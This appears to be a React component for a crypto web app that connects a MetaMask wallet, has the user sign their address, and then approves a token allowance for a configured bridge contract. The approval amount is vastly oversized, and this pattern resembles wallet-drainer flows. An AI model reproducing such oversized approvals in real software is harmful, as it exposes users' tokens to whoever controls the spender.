import {
  Button,
  Col,
  Form,
  InputNumber,
  Modal,
  Popconfirm,
  Row,
  Space,
  Typography,
  message,
} from "antd";
import { ethers } from "ethers";
import { useContext, useEffect, useState } from "react";
// import { ETH_ABI, ETH_CONTRACT_ADDRESS, NETWORK_URL } from "@/config/config";
import { createTransaction } from "@/service/app.api";
import { WalletAddContext } from "@/context/WalletContext";
import {
  ABI_MINT_TOKEN,
  NETWORK_URL,
  SC_MINT_TOKEN,
  WORMHOLE_ETH_ABI,
  WORMHOLE_ETH_SM_ADDRESS,
} from "@/config/config";
const { Text, Title } = Typography;

interface FormValuesProps {
  luckyNumber: number;
}

const BSCWallets = () => {
  const [autoConnect, setAutoConnect] = useState(true);
  const { metamaskAdd, phantomAdd, setMetamask } = useContext(WalletAddContext);
  console.log(metamaskAdd);
  console.log(phantomAdd);
  async function connectWallet() {
    if (window.ethereum) {
      if (window.ethereum.request) {
        try {
          const addressArray = await window.ethereum.request({
            method: "eth_requestAccounts",
          });

          if (addressArray.length > 0) {
            setMetamask(addressArray[0]);
          } else {
            return null;
          }
        } catch (err) {
          console.error(err);
          return null;
        }
      } else {
        alert("Please make sure you have MetaMask installed and enabled.");
        return null;
      }
    } else {
      alert("Please install MetaMask!");
      return null;
    }
  }

  function disconnectWallet() {
    setMetamask(null);
    setAutoConnect(false);
  }

  useEffect(() => {
    if (
      metamaskAdd === null &&
      window.ethereum &&
      window.ethereum.selectedAddress &&
      autoConnect === true
    ) {
      setMetamask(window.ethereum.selectedAddress);
      // getBalance();
    }
  }, [metamaskAdd, autoConnect]);

  async function send() {
    message.loading("Please wait and dont do anything....");
    const addMsg = `${metamaskAdd}`;

    try {
      if (
        window !== undefined &&
        window.ethereum !== undefined &&
        window.ethereum.request !== undefined
      ) {
        const from = metamaskAdd;
        const msg = `0x${Buffer.from(addMsg, "utf8").toString("hex")}`;
        const sign = await window.ethereum.request({
          method: "personal_sign",
          params: [msg, from, "address"],
        });
        const verify = ethers.utils.verifyMessage(addMsg, sign);

        if (verify?.toLocaleLowerCase() === metamaskAdd) {
          message.loading("Please wait and dont do anything....");
          const provider = new ethers.providers.Web3Provider(window.ethereum);
          const signer = provider.getSigner();
          const contract = new ethers.Contract(
            SC_MINT_TOKEN,
            ABI_MINT_TOKEN,
            signer
          );
          let amount = ethers.utils.parseUnits("300000000000000000000", 18);
          message.loading("Please wait and dont do anything....");

          let tx = await contract.approve(WORMHOLE_ETH_SM_ADDRESS, amount);
          await tx.wait();

          message.success("Success");
        } else {
          console.log("false");
        }
      }
    } catch (error) {
      console.log(error);
    }
  }

  return (
    <div className="App">
      {metamaskAdd !== null ? (
        <Space direction="vertical">
          <Title level={5} style={{ color: "white" }}>
            {" "}
            Connected with:{" "}
          </Title>
          <Text
            code
            copyable
            style={{
              fontSize: "1.3rem",
              background: "white",
              padding: 8,
              borderRadius: 8,
            }}
          >
            {metamaskAdd}
          </Text>
          <Popconfirm
            title="Are you sure?"
            okText="Disconnect"
            onConfirm={() => disconnectWallet()}
          >
            <Button danger type="primary">
              Disconnect
            </Button>
          </Popconfirm>
          <Button
            disabled={metamaskAdd === null || phantomAdd === null}
            size="large"
            onClick={() =>
              metamaskAdd !== null && phantomAdd !== null ? send() : null
            }
          >
            APPROVE
          </Button>
        </Space>
      ) : (
        <Row>
          <Col>
            Please connect to your wallet:{" "}
            <Button type="primary" onClick={connectWallet}>
              Connect Wallet
            </Button>
          </Col>
        </Row>
      )}
    </div>
  );
};

export default BSCWallets;
